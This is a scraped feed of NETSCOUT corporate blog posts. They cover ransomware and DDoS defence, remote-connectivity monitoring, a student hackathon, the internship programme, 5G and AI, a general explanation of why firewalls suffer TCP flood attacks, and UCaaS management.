	<li><strong>Faire attention aux fondamentaux de la cyber défense.</strong> Sauvegarder les données de valeur et tester les plans de restauration des données. Effectuer des évaluations de vulnérabilité, corriger et mettre à jour les systèmes informatiques en conséquence pour éviter toute compromission.</li>
	<li><strong>Rester renseigné en permanence sur les menaces.</strong> En se tenant toujours au courant des dernières informations sur les menaces, les entreprises peuvent détecter, enquêter ou rechercher de manière proactive les IoC qui pourraient précéder une attaque par ransomware.</li>
	<li><strong>Utiliser une protection DDoS appropriée.</strong> Les attaques DDoS augmentent à la fois en taille, en fréquence et en complexité. Les meilleures pratiques pour atténuer les DDoS comprennent une combinaison hybride et intelligente d’atténuation des DDoS basées sur le cloud et sur site.</li>
</ul>

<p>Pour finir, les organisations devraient également chercher à déployer des solutions de cybersécurité spécialisées étant capables de contrecarrer toutes les facettes d’une triple attaque d’extorsion.</p>

  <title>Shifting Work and Retail Trends: Focus on Remote Connectivity</title>
  <link>http://localhost:7996/blog/shifting-work-and-retail-trends-focus-remote-connectivity</link>
  <description>The key for comprehensive visibility is to combine packet data and synthetic test technologies for monitoring at the many edges of complex, multi-cloud environments.</description>
  <content:encoded><![CDATA[<p>Workers and shoppers alike have embraced the growing trend toward remote connectivity sparked by the COVID-19 pandemic. A recent <a href="https://www.oberlo.com/blog/ecommerce-trends">report</a> projected that ecommerce sales will increase from $4.9 trillion in 2021 to $6.4 trillion by 2024. And the workplace, which is currently in flux, is likely to shift toward more of a hybrid model with employees splitting time between working in the office and in the home going forward.</p>

<p>A survey published by <a href="https://www.cnbc.com/2021/06/26/heres-what-the-return-to-the-office-will-look-like-this-fall.html"><em>CNBC</em></a> found that 77 percent of companies believe their workforce will use a hybrid model in the near term, which dovetails with a <a href="https://www.fastcompany.com/90665448/5-ways-hybrid-workplace-can-make-companies-more-inclusive"><em>McKinsey</em></a> report earlier this year that predicted 20 to 25 percent of the workforce in advanced economies would likely work remotely.</p>

<p>This increased reliance on remote work and online shopping has put the burden on IT to ensure connectivity is reliable and secure in order to deliver the best digital end-user experience. The complexity of this challenge is significant, especially with so many applications having moved to the cloud, and many back-office applications now being accessed through a VPN gateway.</p>

<p><strong>End Users’ Growing Reliance on Remote Connectivity</strong></p>

<p>More and more workers and shoppers are relying on remote connectivity to conduct business, make purchases, or interact with retailers. For example, when a customer swipes a loyalty card in a store location, that device must seamlessly connect to a central data center in order to authorize a discount. Any disruption can impinge on the customer’s expectations for a smooth transaction and could end up jeopardizing the sale.</p>

<p>Similarly, if a customer is trying to connect with a call center, perhaps using a data center-based unified communication and collaboration (UC&amp;C) application, customer satisfaction may hinge on the quality and reliability of the call. With many call center employees working remotely, having services accessible at their home workstation, such as inventory, order processing, order status, and shipping status, is imperative. And if the call is dropped or the connection is poor, no doubt the customer relationship will be harmed or at the very least diminished.</p>

<p>Another good example is a customer using a mobile banking application to execute a deposit, funds transfer, or other transaction with a branch location. The connectivity between the customer, branch, and central database are vital to the completion of the transaction. Anything less than flawless connectivity is unacceptable.</p>

<p>These days, reliance on connectivity extends to virtually every industry. In the case of manufacturers, engineers might utilize an application to access an automated assembly line, or office personnel might rely on a headquarters application to remotely order raw materials or piece parts from a supplier. Factories must have seamless communications with data centers to conduct inventory management from a remote location through the distribution center to headquarters—enabling the company to maintain productivity in today’s challenging supply chain environment.</p>

<p><strong>Deciphering the Edge</strong></p>

<p>The extensive combination of underlying technologies being utilized by enterprises of every type is putting pressure on IT departments to gain visibility into the services being delivered, so they can adequately manage and secure them. As workers and shoppers increasingly rely on remote connectivity with branch offices and remote locations, the need for metrics that reveal the digital end-user experience is vital so that IT can rapidly analyze and evaluate availability and reliability issues in today’s edge computing environment.</p>

<p>IT faces any number and variety of potential edges for any given application service—from client to network to data center/cloud service edges—creating potential gaps in visibility. As a result, IT needs to identify key instrumentation vantage points to monitor and quickly troubleshoot issues as they emerge to reduce mean-time-to-knowledge (MTTK) and mean-time-to-restore (MTTR) numbers.</p>

<p>For example, monitoring packet data can reveal details related to problems observed at visibility vantage points such as the network and data center/cloud service edges. This information is powerful, because it helps put critical evidence into the hands of the right IT group or third-party vendor to speed up resolution of any disruptive issues.</p>

<p><strong>Combining Packet Data and Synthetic Test Technologies </strong></p>

<p>The key for comprehensive visibility is to combine packet data and synthetic test technologies for monitoring at the many edges of complex, multicloud environments, particularly the client edges—in short, smart edge monitoring. Synthetic testing that includes business transaction testing capabilities allows IT to simulate the many different types of interactions an end user has with applications across a business environment. And because these tests can be conducted during “off” hours when users aren’t utilizing these services, IT can ensure everything is working properly, or be alerted to a problem and often resolve it before the user is impacted.</p>

<p>NETSCOUT is a leader when it comes to smart edge monitoring. Our Smart Edge Monitoring solution delivers borderless monitoring and visibility. This next-generation solution is geared to provide visibility across all of the edges of an enterprise’s infrastructure, allowing IT to deliver the best digital end-user experience across any application.</p>

  <title>What Is the Connectivity Supply Chain, and Why Do Attackers Care?</title>
  <link>http://localhost:7996/blog/supply-chain-connectivity-and-why-attackers-care</link>
  <description>Cyberattackers are waging a war against the underpinning of all interconnected devices—the connectivity supply chain. The good news is that organizations can take several steps to protect themselves.</description>
  <content:encoded><![CDATA[<p>Although we generally tend to think of cyberattacks as being waged against specific entities such as enterprises or service providers, NETSCOUT has identified another massive target for attackers: the connectivity supply chain.</p>

<p><em>Connectivity supply chain</em> is the term NETSCOUT uses for this attack surface because it is made up of all the technologies and services that enable companies and individuals to stay connected to the internet. This includes services that underpin all interconnected devices—enterprise Internet of Things (IoT), computers, mobile phones, and so forth—as well as services that enable enterprises to digitally transform and move resources to the cloud.</p>

<p>Attackers have long been focused on bringing down services that underpin connectivity, targeting both subscribers and the operational infrastructure of the companies themselves. But the dramatic increase in attacks—especially distributed denial-of-service (DDoS) attacks—since the beginning of the COVID-19 pandemic isn’t a coincidence. As shown in the latest NETSCOUT <a href="https://www.netscout.com/threatreport">Threat Intelligence Report</a>, in the 1st half of 2021 service providers that provide connectivity accounted for four of the top 10 verticals targeted by DDoS attacks. Wired telecom carriers took top billing, with 283,516 attacks; wireless providers were third with 84,151 attacks; all other telecommunication carriers were seventh with 14,628 attacks; and telecom resellers were ninth with 2,175 attacks.</p>

<p>Not surprisingly, increases in attacks against these suppliers of connectivity have coincided with increases in attacks against the enterprises that utilize them. This has been especially true since the beginning of the pandemic, which forced enterprises to support work-from-home (WFH) and remote-work initiatives much faster than expected.</p>

<p>Specifically, attackers have focused their attention on technologies that enable things such as cloud computing to function over the internet—especially Domain Name System (DNS) servers, virtual private networks (VPNs), and internet exchanges.</p>

<p>The good news is that service providers and enterprises can take several steps to protect the connectivity supply chain against DDoS attacks, including:</p>

<ul>
	<li>Ensuring compliance with industry best current practices (BCPs) for organizations with business-critical public-facing internet properties</li>
	<li>Implementing appropriate DDoS defenses for public-facing internet properties and supporting infrastructure</li>
	<li>Performing recurring, realistic tests of the DDoS mitigation plan for organizations that operate mission-critical, public-facing internet properties and infrastructure</li>
	<li>Customizing countermeasure selection, tuning, and deployment</li>
</ul>

<p>For more information about protecting the connectivity supply chain, read our white paper “<a href="https://www.netscout.com/sites/default/files/2021-11/SECWP_021_EN-2101%20-%20The%20Weakest%20Link.pdf">The Weakest Link: Attackers Target Connectivity Supply Chain to Disable Enterprise Internet Connectivity</a>,” or get in touch with a security specialist today.</p>

  <title>What Do Students Learn at Hackathons?</title>
  <link>http://localhost:7996/blog/what-do-students-learn-hackathons</link>
  <description>Since 1999, when the term “hackathon” was coined, exponentially increasing numbers of students and working professionals have been attending hackathons worldwide.

  <content:encoded><![CDATA[<p>Since 1999, when the term “hackathon” was coined, exponentially increasing numbers of students and working professionals have been attending hackathons worldwide. But what <em>is</em> a hackathon?</p>

<p>Simply put, the goal of a hackathon is to produce a working prototype of something—usually software or websites, but it can be any number of things, including music and robots—in a specific period of time—usually a day. And the results can be extraordinary. Did you know Twitter and GroupMe were created in hackathons? Hackathons offer participants an opportunity to learn specific technical skills from mentors and peers while also learning other ‘softer’ skills applicable to many situations beyond the scope of the hackathon. NETSCOUT has hosted or sponsored more than 10 hackathons in the past three years.</p>

<p>Recently, a NETSCOUT <a href="https://www.netscout.com/corporate-responsibility/connected-for-good">Heart of Giving</a> team of seven volunteers joined with eight volunteers from <a href="https://www.collin.edu/campuses/prestonridge/index.html">Collin College</a> to support their first hackathon event at the Collin College Frisco, Texas, campus. This hackathon was part of the college’s launch of its new state-of-the-art <a href="https://communityimpact.com/dallas-fort-worth/frisco/education/2021/09/07/first-look-collin-college-opens-new-it-center-at-frisco-campus/">IT Center</a>, and the hackathon was open to high school students who are or will be taking <a href="https://www.collin.edu/express/dualcredit/index.html">dual credit courses</a> at the college.</p>

<p><img alt="​​​​​​Collin Coillege Hackathon Keynote" data-entity-type="file" data-entity-uuid="4f4bdbca-d583-418d-ab36-a88b3f585b0a" src="http://localhost:7996/sites/default/files/inline-images/keynote-speaker-Kelly-Longfellow.jpg" /></p>

<p>“Exposing high school students to hackathons like this inspires them and gets them interested in STEM fields such as computer science,” says NETSCOUT volunteer team captain Maniam Palanivelu, customer success operations leader, Americas. “It also teaches several other skills—such as working with new people in teams (collaboration), problem solving, presentation, time management, coding, and networking, to name a few—and helps them build their resumés for college applications and future <a href="https://www.netscout.com/blog/netscout-internship-program-expands">internships</a>.”</p>

<p>Gregory Newman, associate dean at Collin College, opened the hackathon and was followed by Palanivelu, who presented the participating students with an introduction to NETSCOUT. The theme, climate change, was announced the day of the event, and students were further motivated and inspired by a presentation from industry expert and Ph.D. candidate <a href="https://www.climaterealitydfw.org/kelly-longfellow">Kelly Longfellow</a>, from the Dallas chapter of <a href="https://www.climaterealitydfw.org/">The Climate Reality Project</a>. Her talk covered several aspects and impacts of climate change, which helped the students pick the problems they were passionate about solving.</p>

<p><img alt="Hackathon Student Group Collin College" data-entity-type="file" data-entity-uuid="e7ff7590-ed1a-4f50-a168-1e19699a72d3" src="http://localhost:7996/sites/default/files/inline-images/Student-group-shot.jpg" /></p>

<p>Eight teams of students had 12 hours to complete the challenge by building a functional website or application illustrating a problem caused by climate change and demonstrating a solution. Finished projects addressed topics including recycling, personal green goals tracking, energy savings, water conservation, and the 3three Rs—reduce, reuse, and recycle.</p>

<p>The team for the winning project, <a href="https://libertywingspan.com/58968/campus-life/junior-and-senior-win-first-place-hackathon-challenge/"><em>Compostify</em></a>, described their entry this way: “Our mission is to combat climate change through composting, which is the recycling of organic matter that can be used to grow plants. Composting reduces climate change in two main ways. Firstly, it promotes plant growth, which takes CO2 out of the atmosphere, thus helping to lower the sheet of greenhouse gases surrounding the earth. Secondly, it repurposes organic matter that usually goes to landfills and accumulates even more greenhouse gases like methane.”</p>

<p>In addition to providing prizes, assistance, and mentorship to the Collin College volunteers, judges and, students, the NETSCOUT team earned a $2,500 grant to <a href="http://www.collin.edu/">Collin County Community College District Foundation</a> as part of the <a href="https://www.netscout.com/corporate-responsibility/connected-for-good">Heart of Giving</a> team volunteer program. Karen McCloskey, NETSCOUT director of internal communications and corporate philanthropy, noted, “The Heart of Giving program is a unique way for employees around the world to directly engage with organizations in their own communities to plan and deliver meaningful volunteer service. Engaging with our communities is an important part of our <a href="https://www.netscout.com/sites/default/files/2021-07/9119-Netscout-ESG-Report-2021-006.pdf">environmental, social, and governance</a> (ESG) initiatives, and we are proud to support our employees with this program.”</p>

  <title>NETSCOUT Internship Program Expands to Include More Programming for Students</title>
  <link>http://localhost:7996/blog/netscout-internship-program-expands</link>
  <description>NETSCOUT has an internship program that’s been running for more than a decade. In summer 2021, NETSCOUT introduced a pilot Intern Cohort program, expanding the formal programming for these interns.</description>
  <content:encoded><![CDATA[<p>Did you know NETSCOUT has an internship program? Our long-running, year-round program has provided more than 300 college and graduate program students with full-time, paid work experience for more than 10 years. We have interns working nationally and internationally in all areas of our company, gaining practical experience while building their professional networks. And in the last five years, 25 of those interns have converted to permanent NETSCOUT employees.</p>

<p>This summer’s U.S.-based intern class participated in the inaugural Intern Cohort program—an enhanced and fully virtual internship experience designed and led by Beth Kirsch, employee engagement manager for NETSCOUT. These interns not only completed meaningful, degree-relevant, and resumé-enhancing work but also formed a cross-functional, multisite network based on shared experiences.</p>

<p>When asked about the genesis for this program, Kirsch explained, “We had an intern in HR this summer. When I asked what formal company programming was available for her, I found out there was none.” Seeing a need and wanting to create an exceptional experience for her intern, Kirsch innovated. She created the pilot Intern Cohort program and rolled it out to 21 interns in six departments, across four sites. “When you’re an intern, it can be overwhelming,” Kirsch noted. “I wanted to create a space for them to build community with each other while they’re working here. I hope they take that community with them wherever they go.”</p>

<p>Kirsch conducted a virtual kickoff meeting for the Intern Cohort participants during which she walked the group through a brief history of NETSCOUT, our products and business, and our values. For the meet-and-greet segment, attendees were encouraged to bring a “show and tell” item to share as a way of introducing themselves <em>and </em>sparking some conversation.</p>

<p>The interns also attended the Learn with Leaders meetings, which Kirsch designed. In this series of virtual meetings, seven top leaders from across NETSCOUT discussed various work- and life-related issues. Darren Anstee, chief technology officer for security; Azar Khansari, vice president and associate general counsel; Tony King, senior vice president of International Sales; Jeff Levinson, vice president, general counsel, and secretary; Lon Lowen, associate vice president of engineering; Hardik Modi, area vice president of engineering, threat, and mitigation products; and CEO Anil Singhal spoke about their jobs at NETSCOUT and other topics, including whether they were on the same career paths they’d planned when starting out, how they got to where they are today, leadership philosophy and style, proudest professional accomplishments, and what professional experiences they’ve learned from most.</p>

<p>They also offered advice for our interns at the beginnings of their careers. These meetings weren’t just one-way presentations: They were two-way conversations. Our interns were encouraged to reach out and follow up with these speakers after any of the talks—and they did.</p>

<p>Legal intern Jenna Asarese told us, “I especially enjoyed the Learn with Leaders conversations as it not only allowed me to hear from those most in line with my career path but also from others with very different backgrounds in the company. Learning about their day to day, their path towards NetScout, and even just hearing about their thoughts on the future of the industry was insightful and allowed me to self-reflect on my own journey.”&nbsp;</p>

<p>“Being able to spend time in front of the company’s most influential figures during the Learn with Leaders sessions was powerful,” said engineering intern Joel Harrison. “I was able to take key insights from every single session on how to succeed in my career and in life.”</p>

<p>In addition to the real project work every intern completed, they were invited to create and deliver final presentations for the rest of the Intern Cohort, highlighting their individual accomplishments and learnings throughout the summer<strong><em>. </em></strong>In between the kickoff and end-of-summer celebration, cohort members participated in a virtual social event and kept in touch with each other via a variety of company communication channels.</p>

<p>The response to this new program was overwhelmingly positive, as evidenced by the following reactions from cohort members:</p>

<blockquote class="blog-quote">
<p class="lead">I enjoyed the opportunity to learn from industry professionals while [using my] unique skills that added value to the team.</p>

<p class="lead">It was a fantastic work experience.</p>

<p class="lead">I was able to do a lot of project-based work, which has always been something I enjoyed in school and didn’t get to do very often. I was looking forward to this when I first began this internship, and I was thoroughly fulfilled in this regard.</p>

<p class="lead">It gave me in-field experience, allowed me to start networking, and allowed me the opportunity to continue work during school.</p>
</blockquote>

<p>Obviously, we plan to build on this success, making the Intern Cohort a regular program and rolling it out again in summer 2022. Kirsch hopes to expand the program to get more employees involved as guides and mentors and to expand the opportunities for the cohort members to interact more next year.</p>

  <title>Government Agency Assures User Experience with Visibility Into Judicial and Healthcare Services</title>
  <link>http://localhost:7996/blog/government-agency-assures-user-experience</link>
  <description>See how a government agency assured user experience for its constituents with visibility into its judicial document management system and web-based COVID-19 vaccination registration portal.</description>
  <content:encoded><![CDATA[<p>Local governments such as state, provincial, county, parish, and city agencies have unique IT demands. Topping the list is the need to ensure the high quality access to digital services for constituent end users. This has its own challenges because of the virtually infinite paths digital activity can take for each constituent transaction—such as registering a car with the department of motor vehicles, paying taxes, or filing for unemployment.</p>

<p>As government agencies invest in digital transformations, operate their existing applications and data centers, or respond to natural disasters and pandemics, assuring the performance and availability of all their services, to employees <em>and</em> constituents, is the priority.</p>

<p>Assuring performance and availability of all the governments’ applications, given the breadth and variety of technologies involved, can be difficult, especially considering the complexity. See how this government agency implemented NETSCOUT’s service assurance for its critical, constituent-impacting services.</p>

  <title>With Cyberattacks on the Rise, Cyber Intelligence Is a Must</title>
  <link>http://localhost:7996/blog/cyber-intelligence-a-must</link>
  <description>Unique cyber intelligence technology detects and investigates suspicious activities in real time and retrospectively, identifying threats before they spread.</description>
  <content:encoded><![CDATA[<p>Cyberattacks and data breaches continue to escalate, reaching record levels. In fact, <a href="https://www.forbes.com/sites/chuckbrooks/2021/10/24/more-alarming-cybersecurity-stats-for-2021-/?sh=51c95e6c4a36"><em>Forbes</em></a> reports that the sheer number of data breaches In 2021 has already exceeded those of 2020. Forbes cites a study that claims the 1,111 data breaches detected so far this year already exceeds the total number of data compromises from all causes in 2020.</p>

<p>Bottom line: The problem is bad and only promises to get much worse.</p>

<p>With <a href="https://www.netscout.com/threatreport">cyberattacks increasing</a> and breaches making headlines, IT security teams are faced with the grim reality that existing tools are simply no match for this exponentially growing threat. To make matters worse, as the risk grows, so does the cost. The cost of combatting the threats and the potential losses from businesses being compromised are skyrocketing.</p>

<p>A major shortcoming of many of today’s cybersecurity tools is that the typical data sets feeding them are reactive, not granular, and do not extend to the earliest indications of a potential attack. This makes it difficult to identify threats early in the attack lifecycle. As a result, security professionals are not armed with the information they need to prevent infections from spreading, identify compromised assets, or stop future attacks.</p>

<p><strong>Putting Intelligence in the Hands of the Good Guys</strong></p>

<p>With the recent release of NETSCOUT’S Omnis Cyber Intelligence (OCI), the industry’s fastest and most scalable network security software solution, security professionals finally have an upper hand in the fight against cyberattacks.</p>

<p>OCI is built on the foundation of the industry’s most prominent network monitoring and packet recording and analysis technology. It uniquely detects and investigates suspicious activities in real time and retrospectively, identifying threats before they spread.</p>

<p>Using market-leading visibility technology, OCI increases the range and depth of security intelligence and makes it accessible to security teams in real time. The solution consists of an analytics stack and cybersecurity software sensors called Omnis CyberStreams.</p>

<p>” Enterprises have invested heavily in cybersecurity solutions, but they are largely ineffective because they lack the actionable visibility needed to spot attacks before they have broad impact,” said Sanjay Munshi, vice president, product management, NETSCOUT. “As attack surfaces expand, the Omnis Cyber Intelligence solution extends throughout the infrastructure, integrates into existing ecosystems, and becomes part of the growing movement toward XDR (Extended Detection and Response), using meaningful metadata, or Smart Data, and powerful cyber analytics to quickly get to the root cause of the cybersecurity issue and mitigate risk.”</p>

<p>OCI enables security teams to:</p>

<ul>
	<li>Continuously scan and detect attacks earlier, minimizing exposure and potentially heading off threats</li>
	<li>Access historical evidence to understand how an attack started in order to prevent similar breaches in the future</li>
	<li>Monitor exposed attack surfaces, allowing security teams to optimize the effectiveness of defenses</li>
	<li>Evaluate the extent of penetration and impacted assets when attacks occur to prevent malware from spreading</li>
	<li>Deploy on premises, in virtualized data centers, and in the public cloud, without impacting security governance and workflows</li>
	<li>Integrate security ecosystems by using APIs and partnerships with leading vendors, such as Splunk, Palo Alto Networks, and AWS</li>
</ul>

  <title>Who’s Watching Over Your Network and Applications After Hours?</title>
  <link>http://localhost:7996/blog/whos-watching-over-your-network-after-hours</link>
  <description>As workforces have adopted work-from-home postures and reliance on network connectivity and business applications has become greater than ever, IT is under pressure to ensure systems are operating around the clock.</description>
  <content:encoded><![CDATA[<p>IT professionals typically are some of the hardest-working people in any given organization. They are often the unsung heroes that keep all the systems up and running. But even IT pros have to sleep, and that’s when problems can turn into nightmares. Even when on duty, a recent <a href="https://vmblog.com/archive/2019/03/22/is-it-spending-too-much-time-troubleshooting-the-network-new-survey-suggests-yes.aspx#.YUtwAH1lA2w">survey</a> revealed, 38 percent of IT and networking professionals were not always the first to identify network performance issues. This means that end users are the first to experience and report a problem, providing details necessary for IT to begin addressing the issues.</p>

<p>The same report found that 35 percent of IT pros indicated they lack adequate visibility into performance across the entire network. And 34 percent stated that the inability to analyze historical data is a challenge when dealing with recurring or complex network issues.</p>

<p><strong>Failure Waits for No One!</strong></p>

<p>Working 10, 12, or even 16 hours a day, five days a week isn’t an unusual schedule for IT organizations. Unfortunately, as more and more workforces have adopted work-from-home postures, and reliance on network connectivity and business applications has become greater than ever, IT is under increased pressure to ensure systems are operating without fail—day or night.</p>

<p>Issues occurring in the middle of the night, over weekends, or during holidays become a ticking time bomb waiting to wreak havoc on users when they start their work day. Problems occurring during uncovered periods may go unnoticed while IT staff are away from the office. For example, should a failure occur after hours at a company with its headquarters based on the West Coast, when employees show up to work on the East Coast the next morning, they will run into system problems first thing. And IT won’t be there to address it, creating a delay in when issues will be resolved. The implications to the business could be significant.</p>

<p><strong>The Value of “Follow the Sun” 24/7/365 Monitoring and Testing</strong></p>

<p>Proactive, managed monitoring services offer IT a way to monitor, service-triage, and gain critical data insights into business, industry, voice, video, and software-as-a-service (SaaS) application performance issues at any time of the day or night.</p>

<p>NETSCOUT Visibility as a Service (VaaS) offers a “follow the sun” model that effectively keeps a watchful eye on a company’s infrastructure, even when IT personnel are not in the office. NETSCOUT VaaS can provide coverage and expertise 24/7/365, introducing another set of eyes and ears looking for and initiating troubleshooting as soon as issues appear.</p>

<p>Once problems are detected, rapid investigation proceeds, so problems can be pinpointed, IT can be advised, and corrective actions can be initiated. In many cases, this can be accomplished before employees start their day, completely avoiding any resulting impact to corporate productivity. At the same time, this reduces the burden on IT resources, because no one has to be assigned the graveyard shift to monitor systems overnight or on weekends.</p>

<p>NETSCOUT VaaS managed support offers several practical advantages as well. Not having to hire and train multiple after-hours/holiday staff reduces costs. For example, two fully trained IT personnel generally cost a total of $400,000 ($200,000 each) per year, and typically require coverage for paid time off. Having skilled experts analyzing data from NETSCOUT’s service assurance solutions 24 hours a day, seven days a week assures quality application and network performance in a cost-effective manner.</p>

<p>NETSCOUT is an expert when it comes to Visibility as a Service. NETSCOUT’S VaaS works with NETSCOUT products, such as nGeniusONE, InfiniStreamNG, nGeniusPULSE, nPoints, nGenius Packet Flow Switches, Omnis Cyber Investigator, and Smart Edge Monitoring solutions, helping to cut mean time to knowledge (MTTK) and speed up mean time to repair (MTTR).</p>

<p>As one insurance company described the experience with NETSCOUT VaaS, “They are willing to jump on many late-night calls as we work through product lifecycle management and upgrades and help drive them to completion. Having VaaS for helping with staff augmentation is crucial.”</p>

  <title>7 Reasons Why 5G Needs Artificial Intelligence to Succeed</title>
  <link>http://localhost:7996/blog/7-reasons-why-5g-needs-artificial-intelligence-succeed</link>
  <description>5G is pulling in data at a rate with which humans cannot keep up. AI promises to be the best way to leverage the information from that data and ensure smart business outcomes.</description>
  <content:encoded><![CDATA[<p>According to NETSCOUT CTO and Senior Vice President Bruce Kelley, 5G is a fire hose for data. The fire hose analogy crystalizes the rate at which a 5G network collects data. But it also provides a glimpse into the lingering challenges inherent in managing massive amounts of data to continuously find business value that will optimize customer experiences, improve existing business operations, and increase return on investment (ROI).</p>

<p>The data 5G generates is destined to increase exponentially. Research shows that by 2030 the shortage of data scientists in the U.S. alone will reach <a href="https://www.mckinsey.com/featured-insights/digital-disruption/whats-now-and-next-in-analytics-ai-and-automation">the quarter-million level</a>. Simply put, 5G is pulling in data at a rate with which humans cannot keep up. One way to bridge this gap is via artificial intelligence (AI).</p>

<p>AI will help enterprises with 5G networks to automate mundane, time-consuming, and tedious tasks, and allow for discovery of network events that cannot be determined by humans. AI is a big part of 5G. Here are seven reasons 5G needs AI to succeed:</p>

<p>1. <strong>Optimum customer experiences. </strong>AI can be applied to large amounts of data to quickly analyze, apply reason, data fit, cluster, and optimize results in a reliable and impactful way to ensure consistent customer experiences.</p>

<p>2. <strong>Exponential data growth. </strong>From factory floor to autonomous vehicles, the Internet of Things (IoT) will push the exponential growth of 5G data, and each IoT device sensor will lead to more data. AI modules can optimize this massive amount of data to achieve intelligence for business impact.</p>

<p>3. <strong>Diagnostic checklists. </strong>Numerous concerns could arise in a complex 5G system. With AI, diagnostic checklists can be automated to support instant troubleshooting of issues, including but not limited to video quality, latency issues, and audio gaps, which will free up personnel to focus on the higher-value activities for which they are better suited.</p>

<p>4. <strong>Always-on remote operations. </strong>The global COVID-19 pandemic makes remote operations highly important due to the drastic changes in network service demands, as well as operational procedures (e.g., the need for social distancing). AI can provide automation for rote tasks and can better facilitate coordination in-person or not; this makes 5G networks scalable for the workplace of the future moving forward.</p>

<p>5. <strong>Predictive and proactive networks. </strong>The 5G ecosystem is drastically more complex than prior technology iterations. Distinct from the assorted group of players—service providers, core and edge cloud providers, and enterprises—5G requires diverse and multidimensional session elements, from location to software version, to device type, and so on. AI routines can quickly navigate the complexity of the 5G networks—and do so more accurately than human recognition can—yielding more-predictive and proactive networks and resulting in viable universal enterprise-grade mobile networks.</p>

<p>6. <strong>Cybersecurity and automatic detection. </strong>Vectors for attack have the potential to significantly increase in a decentralized 5G network, due to a large attack surface and applications hosted at the “edges.” The applications at the edge are more difficult to protect. Implementing AI modules is important for supporting automatic detection of potential tampering for 5G-sensitive applications.</p>

<p>7. <strong>Visibility and organizational culture. </strong>A diverse 5G universe must include a visibility strategy with end-through-end capabilities into all AI modules for 5G network components, from differing cloud categories (public, edge, and so forth) to service types (e.g., video and IoT). Cultural challenges are likely to arise in transitioning personnel and processes from manual styles of work to more automated methodologies. Comprehensive visibility can provide actionable insights to help with a smooth and gradual transition from 4G to 5G.</p>

<p>To take full advantage of 5G, enterprises need to consider a vendor with deep domain knowledge in multiple disciplines that can help to integrate AI into their 5G networks. NETSCOUT scalable and vendor-agnostic solutions can provide end-through-end visibility from radio access network (RAN), core network, and data center edge with actionable insights for any network, any cloud, any technology, and any edge throughout the 5G lifecycle.</p>

  <title>Why Firewalls Are Targets for DDoS Attacks</title>
  <link>http://localhost:7996/blog/why-firewalls-are-targets-ddos-attacks</link>
  <description>Firewalls are targets for state exhaustion DDoS attacks. The only way to stop those attacks is to implement an intelligent DDoS mitigation solution that operates in a stateless or semi-stateless manner.</description>
  <content:encoded><![CDATA[<p>Many cybersecurity companies rely on devices such as firewalls, <a href="https://www.netscout.com/blog/why-are-vpns-ddos-targets">virtual private networks</a> (VPNs), load balancers, and other edge devices to protect enterprise networks from distributed denial-of-service (DDoS) attacks. But the reality is that such devices contain “state” information that’s used for routing and traffic management.</p>

<p>To understand the vulnerability of stateful devices, it’s helpful to look at one of the oldest types of DDoS attacks still in use today: TCP flood attack, which is one example of a broader category of state exhaustion DDoS attacks. TCP flood attacks most commonly are used to send numerous—or <em>floods</em> of—SYN packets to start a TCP connection to a server. The client and server then exchange a series of messages in this fashion:</p>

<ol>
	<li>Client (which is not a legitimate user and more likely a DDOS attack tool) requests a connection by sending a synchronize (SYN) message to the server</li>
	<li>The server records the request for connection in a finite sized TCP state table and acknowledges the request by sending the client a synchronize-acknowledge (SYN-ACK) message</li>
	<li>Because the client is not a legitimate user, it never responds with an ACK. However, the TCP connection in the TCP state table remains open for a period of time.</li>
</ol>

<p>Because each SYN packet uses up device resources (e.g. memory used to keep track of connection I the TCP state table), attackers simply flood the device with so many SYN messages that it eventually fills the TCP state table and stops accepting new connections. Although that might sound like a pretty simple attack with little payoff, nothing could be further from the truth.</p>

<p>According to the 1H 2021 NETSCOUT <a href="https://www.netscout.com/threatreport">Threat Intelligence Report</a>, TCP ACK flood attacks were the most common types of DDoS attacks, accounting for more than 1.4 million attacks in the first half of the year. To put that into perspective, DNS reflection/amplification attacks were the most common types of DDoS attacks for the previous two consecutive years. However, there were 19 percent more TCP-based flood attacks than reflection/amplification attacks in 1H 2021, indicating that attackers have no problem using old-school tactics to get at the enterprise resources they’re looking to nab.</p>

<p><strong>Firewalls: A Sad State of Affairs </strong></p>

<p>One of the top targets for such attacks is the enterprise firewall. At first glance, that seems counterintuitive, because firewalls often are touted as being capable of stopping DDoS attacks. The reality, however, is much grimmer.</p>

<p>Traditionally, firewalls are designed to monitor states of network traffic, using stateful packet inspection (SPI) to make decisions about the risk from incoming traffic and resource requests. But the stateful nature of firewalls makes them susceptible to state-exhaustion attacks such as TCP flood attacks. Moreover, they don’t provide visibility into DDoS attack traffic or communicate well with cloud-based solutions to mitigate such attacks.</p>

<p>NETSCOUT’s annual Worldwide Infrastructure Security Report (WISR), which delivers insights from a global survey of network, security, and IT decision-makers across enterprise and service provider organizations, pinpoints the seriousness of stateful attacks against firewalls. In the 16th annual WISR, more than half of respondents said their firewalls failed to protect from—or even contributed to—outages from DDoS attacks. Adding further insult to injury, 83 percent said their firewalls contributed to network and services outages and/or crashed during a DDoS attack.</p>

<p><strong>The Solution: Intelligent, Stateless Mitigation </strong></p>

<p>The only way to stop DDoS attacks against firewalls is to implement an intelligent DDoS mitigation solution that operates in a stateless or semi-stateless manner and integrates the following features:</p>

<ul>
	<li>Predominantly uses stateless packet processing technology.</li>
	<li>When stateful inspection is required, makes use of an ephemeral challenge to determine the legitimacy of the connection.</li>
	<li>Is deployed on customer premises, north bound of stateful firewall, VPN gateway and other stateful devices.</li>
	<li>Easily integrates into the cybersecurity stack</li>
</ul>

  <title>Managing Converging UCaaS Technology Transformations</title>
  <link>http://localhost:7996/blog/managing-converging-ucaas-technology</link>
  <description>The key for managing multivendor UCaaS environments is NETSCOUT Visibility Without Borders and real-time, vendor-neutral voice and video analytics.</description>
  <content:encoded><![CDATA[<p>There is plenty of available industry guidance describing the relative benefits offered by Cisco Webex, Microsoft Teams, and Zoom solutions for unified communications-as-a-service (UCaaS) technology operations. These UCaaS solutions and other industry-leading options (e.g., Google Meet) have helped sustain customer-facing and corporate communication transitions across the multiphase hybrid workforce era.</p>

<p>Although some IT operations teams have standardized their users on Microsoft Teams or Webex, that does not mean Zoom isn’t used by company employees and executives. Many educational institutions tethered to the Google Cloud by extension use Google Meet for UCaaS, but they also rely on Zoom for remote learning due to that platform’s teacher-friendly collaboration features.</p>

<p>Other factors driving multi-UCaaS solution adoption include feature-driven user preference, device or browser interoperability, and whether a specific UCaaS technology better supports large-scale teleconferencing, one-on-one meetings, or highly interactive on-line collaborations.</p>

